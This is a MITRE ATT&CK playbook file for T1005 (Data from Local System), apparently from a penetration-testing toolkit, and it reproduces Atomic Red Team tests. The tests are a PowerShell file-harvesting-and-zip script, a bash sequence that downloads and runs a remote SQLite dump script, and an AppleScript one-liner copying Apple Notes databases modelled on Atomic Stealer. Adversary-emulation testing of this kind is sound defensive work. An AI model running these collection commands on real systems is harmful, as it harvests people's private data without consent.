---
name: "T1005_data-from-local-system"
description: "Adversaries may search local system sources, such as file systems, configuration files, local databases, virtual machine files, or process memory, to find files of interest and sensitive data prior..."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1005
  - collection
  - esxi
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1005"
tactic: "collection"
all_tactics:
  - collection
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1005"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-200
chains_with: []
prerequisites: []
severity_boost: {}
---

# T1005 Data from Local System

## High-Level Description

Adversaries may search local system sources, such as file systems, configuration files, local databases, virtual machine files, or process memory, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.

## Kill Chain Phase

- Collection (TA0009)

**Platforms:** ESXi, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Data from Local System technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Data from Local System
- [ ] Check Linux systems for indicators of Data from Local System
- [ ] Check macOS systems for indicators of Data from Local System
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Search files of interest and save them to a single zip file (Windows)

This test searches for files of certain extensions and saves them to a single zip file prior to extraction.

**Supported Platforms:** windows

```powershell
$startingDirectory = "#{starting_directory}"
$outputZip = "#{output_zip_folder_path}"
$fileExtensionsString = "#{file_extensions}"
$fileExtensions = $fileExtensionsString -split ", "

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"

  Write-Host "Zip file created: $outputZip\data.zip"
  } else {
      Write-Host "No files found with the specified extensions."
  }
```

### Atomic Test 2: Find and dump sqlite databases (Linux)

An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.

**Supported Platforms:** linux

```bash
cd $HOME
curl -O #{remote_url}/art
curl -O #{remote_url}/gta.db
curl -O #{remote_url}/sqlite_dump.sh
chmod +x sqlite_dump.sh
find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
```

**Dependencies:**

- Check if running on a Debian based machine.

### Atomic Test 3: Copy Apple Notes database files using AppleScript

This command will copy Apple Notes database files using AppleScript as seen in Atomic Stealer.

**Supported Platforms:** macos

```bash
osascript -e 'tell application "Finder"' -e 'set destinationFolderPath to POSIX file "#{destination_path}"' -e 'set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Data from Local System by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1005 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1057 Data Loss Prevention

Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted.

## Detection

### Detection of Local Data Collection Prior to Exfiltration

## Risk Assessment

| Finding                                     | Severity | Impact     |
| ------------------------------------------- | -------- | ---------- |
| Data from Local System technique applicable | Low      | Collection |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [show_run_config_cmd_cisco](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/show_protocols_through_showmon.html#wp2760878733)
- [Mandiant APT41 Global Intrusion ](https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits)
- [US-CERT-TA18-106A](https://www.us-cert.gov/ncas/alerts/TA18-106A)
- [Atomic Red Team - T1005](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1005)
- [MITRE ATT&CK - T1005](https://attack.mitre.org/techniques/T1005)
